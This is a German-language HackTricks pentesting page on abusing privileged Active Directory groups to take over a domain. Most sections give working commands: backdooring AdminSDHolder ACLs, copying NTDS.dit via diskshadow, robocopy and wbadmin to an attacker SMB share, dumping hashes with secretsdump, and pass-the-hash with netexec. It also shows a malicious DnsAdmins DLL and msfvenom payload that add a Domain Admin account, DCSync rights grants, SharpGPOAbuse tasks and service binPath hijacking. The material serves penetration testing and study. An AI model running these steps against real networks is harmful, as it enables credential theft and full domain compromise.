# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsberechtigungen

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist berechtigt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Außerdem ermöglicht sie die lokale Anmeldung am Domain Controller (DC).

Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausgeführt:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung am DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle „protected groups“ innerhalb von Active Directory festlegt, einschließlich Gruppen mit hohen Berechtigungen. Dieser Mechanismus gewährleistet die Sicherheit dieser Gruppen, indem er unbefugte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe verändert und einem Standardbenutzer vollständige Berechtigungen gewährt. Dadurch würde dieser Benutzer effektiv die vollständige Kontrolle über alle geschützten Gruppen erhalten. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.<sup>[[14]](#references)</sup>

Aktuelle Dokumentation zu Windows Server behandelt weiterhin mehrere integrierte operator groups als **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, usw.). Der **SDProp**-Prozess wird standardmäßig alle 60 Minuten auf dem **PDC Emulator** ausgeführt, setzt `adminCount=1` und deaktiviert die Vererbung für geschützte Objekte. Dies ist sowohl für Persistenz als auch für die Suche nach veralteten privilegierten Benutzern nützlich, die aus einer geschützten Gruppe entfernt wurden, aber weiterhin die ACL ohne Vererbung besitzen.<sup>[[12]](#references)</sup>

Zu den Befehlen zum Überprüfen der Mitglieder und Ändern der Berechtigungen gehören:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Ein Skript zur Beschleunigung des Wiederherstellungsprozesses ist verfügbar: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Informationen finden Sie unter [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen gelöschter Active-Directory-Objekte, wodurch vertrauliche Informationen offengelegt werden können:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Dies ist nützlich, um **frühere Privilegienpfade wiederherzustellen**. Gelöschte Objekte können weiterhin `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, alte SPNs oder den DN einer gelöschten privilegierten Gruppe offenlegen, die später von einem anderen Operator wiederhergestellt werden kann.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Zugriff auf den Domain Controller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, sofern der Benutzer nicht Mitglied der Gruppe `Server Operators` ist, wodurch sich die Zugriffsebene ändert.

### Privilege Escalation

Mit `PsService` oder `sc` aus Sysinternals können Dienstberechtigungen überprüft und geändert werden. Die Gruppe `Server Operators` verfügt beispielsweise über vollständige Kontrolle über bestimmte Dienste, wodurch die Ausführung beliebiger Befehle und eine Privilege Escalation möglich sind:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` über vollständigen Zugriff verfügen und dadurch Dienste für höhere Privilegien manipulieren können.

## Backup Operators

Die Mitgliedschaft in der Gruppe `Backup Operators` ermöglicht aufgrund der Privilegien `SeBackup` und `SeRestore` den Zugriff auf das Dateisystem von `DC01`. Diese Privilegien ermöglichen das Durchqueren von Ordnern, das Auflisten von Inhalten und das Kopieren von Dateien – auch ohne explizite Berechtigungen – unter Verwendung des Flags `FILE_FLAG_BACKUP_SEMANTICS`. Für diesen Prozess müssen bestimmte Skripte verwendet werden.<sup>[[1]](#references)</sup>

Um die Gruppenmitglieder aufzulisten, führe Folgendes aus:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Privilegien lokal auszunutzen, werden folgende Schritte durchgeführt:

1. Erforderliche Bibliotheken importieren:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` aktivieren und überprüfen:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Zugriff auf Dateien aus eingeschränkten Verzeichnissen und Kopieren dieser, zum Beispiel:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direkter Zugriff auf das Dateisystem des Domain Controllers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM hashes für Benutzer und Computer der Domain enthält.

#### Using diskshadow.exe

1. Erstelle eine Schattenkopie des `C`-Laufwerks:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopiere `NTDS.dit` aus der Schattenkopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ kannst du `robocopy` zum Kopieren von Dateien verwenden:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. `SYSTEM` und `SAM` für das Abrufen von Hashes extrahieren:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Alle Hashes aus `NTDS.dit` abrufen:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Verwendung von wbadmin.exe

1. Richten Sie das NTFS-Dateisystem für den SMB server auf dem Angreifercomputer ein und cachen Sie die SMB-Anmeldedaten auf dem Zielcomputer.
2. Verwenden Sie `wbadmin.exe` für das Systembackup und die Extraktion von `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Eine praktische Demonstration finden Sie im [DEMO-VIDEO MIT IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der Gruppe **DnsAdmins** können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS server zu laden, der häufig auf Domain Controllern gehostet wird. Diese Fähigkeit bietet erhebliches Ausnutzungspotenzial.

Um die Mitglieder der Gruppe DnsAdmins aufzulisten, verwenden Sie:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Beliebige DLL ausführen (CVE‑2021‑40469)

> [!NOTE]
> Diese Schwachstelle ermöglicht die Ausführung beliebigen Codes mit SYSTEM-Berechtigungen im DNS-Dienst (üblicherweise innerhalb der DCs). Dieses Problem wurde 2021 behoben.

Mitglieder können den DNS-Server dazu veranlassen, eine beliebige DLL zu laden (entweder lokal oder von einer Remote-Freigabe), indem sie Befehle wie die folgenden verwenden:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Das Neustarten des DNS-Dienstes (wofür möglicherweise zusätzliche Berechtigungen erforderlich sind) ist notwendig, damit die DLL geladen wird:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, siehe ired.team.

#### Mimilib.dll

Es ist ebenfalls möglich, mimilib.dll für command execution zu verwenden, indem die Datei so modifiziert wird, dass bestimmte Befehle oder reverse shells ausgeführt werden. [Weitere Informationen finden Sie in diesem Beitrag](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins können DNS records manipulieren, um Man-in-the-Middle- (MitM-)Angriffe durchzuführen, indem sie nach der Deaktivierung der globalen query block list einen WPAD record erstellen. Tools wie Responder oder Inveigh können zum Spoofing und Capturing des Netzwerkverkehrs verwendet werden.

### Event Log Readers
Mitglieder können auf event logs zugreifen und dabei möglicherweise sensible Informationen wie plaintext passwords oder Details zur command execution finden:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Diese Gruppe kann DACLs für das Domänenobjekt ändern und sich dadurch potenziell DCSync-Berechtigungen gewähren. Techniken zur privilege escalation durch Ausnutzung dieser Gruppe werden im Exchange-AD-Privesc GitHub repo beschrieben.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Wenn du als Mitglied dieser Gruppe agieren kannst, besteht der klassische Missbrauch darin, einem vom Angreifer kontrollierten Sicherheitsprinzipal die für [DCSync](dcsync.md) erforderlichen Replikationsrechte zu gewähren:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historisch kombinierte **PrivExchange** mailbox access, coerced Exchange authentication und LDAP relay, um dieses gleiche primitive zu erreichen. Selbst wenn dieser relay path mitigiert ist, bleibt die direkte Mitgliedschaft in `Exchange Windows Permissions` oder die Kontrolle über einen Exchange-Server ein hochrangiger Weg zu Domänenreplikationsrechten.

## Hyper-V Administrators

Hyper-V Administrators haben vollständigen Zugriff auf Hyper-V, der ausgenutzt werden kann, um die Kontrolle über virtualisierte Domain Controllers zu erlangen. Dazu gehören das Klonen laufender DCs und das Extrahieren von NTLM hashes aus der Datei NTDS.dit.

### Exploitation Example

Der praktische Missbrauch besteht normalerweise im **offline access auf DC-Datenträger und Checkpoints** und nicht in alten host-level LPE tricks. Mit Zugriff auf den Hyper-V-Host kann ein Operator einen virtualisierten Domain Controller als Checkpoint speichern oder exportieren, die VHDX mounten und `NTDS.dit`, `SYSTEM` sowie andere secrets extrahieren, ohne LSASS innerhalb des Gasts anzufassen:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Von dort aus kannst du den `Backup Operators`-Workflow wiederverwenden, um `Windows\NTDS\ntds.dit` und die Registry-Hives offline zu kopieren.

## Group Policy Creators Owners

Diese Gruppe ermöglicht es ihren Mitgliedern, Group Policies in der Domäne zu erstellen. Ihre Mitglieder können Group Policies jedoch weder auf Benutzer oder Gruppen anwenden noch bestehende GPOs bearbeiten.

Die wichtige Besonderheit ist, dass der **Ersteller zum Besitzer des neuen GPOs wird** und normalerweise genügend Rechte erhält, um es anschließend zu bearbeiten. Das macht diese Gruppe interessant, wenn du entweder:

- ein bösartiges GPO erstellen und einen Admin davon überzeugen kannst, es mit einer Ziel-OU oder Domäne zu verknüpfen
- ein von dir erstelltes GPO bearbeiten kannst, das bereits an einer nützlichen Stelle verknüpft ist
- ein anderes delegiertes Recht missbrauchen kannst, das dir erlaubt, GPOs zu verknüpfen, während diese Gruppe dir die Bearbeitungsseite ermöglicht

In der Praxis bedeutet der Missbrauch normalerweise, über SYSVOL-basierte Policy-Dateien eine **Immediate Task**, ein **startup script**, eine **local admin membership** oder eine Änderung der **user rights assignment** hinzuzufügen.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Wenn die GPO manuell über `SYSVOL` bearbeitet wird, darf nicht vergessen werden, dass die Änderung allein nicht ausreicht: `versionNumber`, `GPT.ini` und manchmal auch `gPCMachineExtensionNames` müssen ebenfalls aktualisiert werden, andernfalls ignorieren Clients die Richtlinienaktualisierung.<sup>[[9]](#references)</sup>

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt wird, verfügt eine spezielle Gruppe namens **Organization Management** über weitreichende Berechtigungen. Diese Gruppe ist berechtigt, auf **die Postfächer aller Domänenbenutzer** zuzugreifen, und besitzt **vollständige Kontrolle über die Organisationseinheit (OU) „Microsoft Exchange Security Groups“**. Diese Kontrolle umfasst auch die Gruppe **`Exchange Windows Permissions`**, die für eine privilege escalation ausgenutzt werden kann.

### Privilege Exploitation and Commands

#### Print Operators

Mitglieder der Gruppe **Print Operators** verfügen über mehrere Berechtigungen, darunter **`SeLoadDriverPrivilege`**, die es ihnen ermöglicht, sich **lokal an einem Domain Controller anzumelden**, diesen herunterzufahren und Drucker zu verwalten. Um diese Berechtigungen auszunutzen, ist insbesondere dann ein Bypass der User Account Control (UAC) erforderlich, wenn **`SeLoadDriverPrivilege`** in einem nicht erhöhten Kontext nicht sichtbar ist.<sup>[[1]](#references)</sup>

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Auf Domain Controllern ist diese Gruppe gefährlich, da die standardmäßige Domain Controller Policy `SeLoadDriverPrivilege` für **`Print Operators`** gewährt. Wenn du ein erhöhtes Token für ein Mitglied dieser Gruppe erlangst, kannst du das Privileg aktivieren und einen signierten, aber verwundbaren Treiber laden, um zu Kernel/SYSTEM zu gelangen.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Details zur Token-Handhabung findest du unter [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Den Mitgliedern dieser Gruppe wird über das Remote Desktop Protocol (RDP) Zugriff auf PCs gewährt. Zum Auflisten dieser Mitglieder stehen PowerShell-Befehle zur Verfügung:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Erkenntnisse zum Ausnutzen von RDP finden sich in speziellen pentesting-Ressourcen.

#### Remote Management Users

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Die Aufzählung dieser Mitglieder erfolgt durch:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für **WinRM**-bezogene Exploitation-Techniken sollte die entsprechende Dokumentation konsultiert werden.

#### Server Operators

Diese Gruppe verfügt über Berechtigungen, um verschiedene Konfigurationen auf Domain Controllern vorzunehmen, einschließlich Sicherungs- und Wiederherstellungsberechtigungen, der Änderung der Systemzeit und des Herunterfahrens des Systems.<sup>[[1]](#references)</sup> Um die Mitglieder aufzulisten, wird der folgende Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Auf Domänencontrollern verfügen `Server Operators` üblicherweise über genügend Rechte, um **Dienste neu zu konfigurieren oder zu starten/zu stoppen**, und erhalten über die standardmäßige DC-Richtlinie außerdem `SeBackupPrivilege`/`SeRestorePrivilege`. In der Praxis macht sie das zu einer Brücke zwischen **service-control abuse** und **NTDS-Extraktion**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Wenn eine Service-ACL dieser Gruppe Rechte zum Ändern/Starten gewährt, verweise den Service auf einen beliebigen Befehl, starte ihn als `LocalSystem` und stelle anschließend den ursprünglichen `binPath` wieder her. Wenn die Service-Steuerung gesperrt ist, greife auf die oben beschriebenen Techniken der `Backup Operators` zurück, um `NTDS.dit` zu kopieren.

## Referenzen

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
